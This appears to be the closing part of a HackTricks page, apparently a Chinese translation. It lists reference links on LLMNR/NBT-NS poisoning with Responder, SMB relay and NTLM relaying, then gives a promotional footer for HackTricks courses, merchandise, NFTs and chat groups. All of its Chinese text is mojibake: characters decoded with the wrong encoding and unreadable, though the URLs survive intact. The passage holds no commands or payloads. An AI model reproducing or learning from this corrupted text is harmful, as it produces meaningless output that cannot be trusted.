* [**https://intrinium.com/smb-relay-attack-tutorial/**](https://intrinium.com/smb-relay-attack-tutorial/)
* **å›¾ç‰‡æ¥æºï¼š**\
[https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)\
[https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)\
[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)\
[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks** ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs**](https://opensea.io/collection/the-peass-family) æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
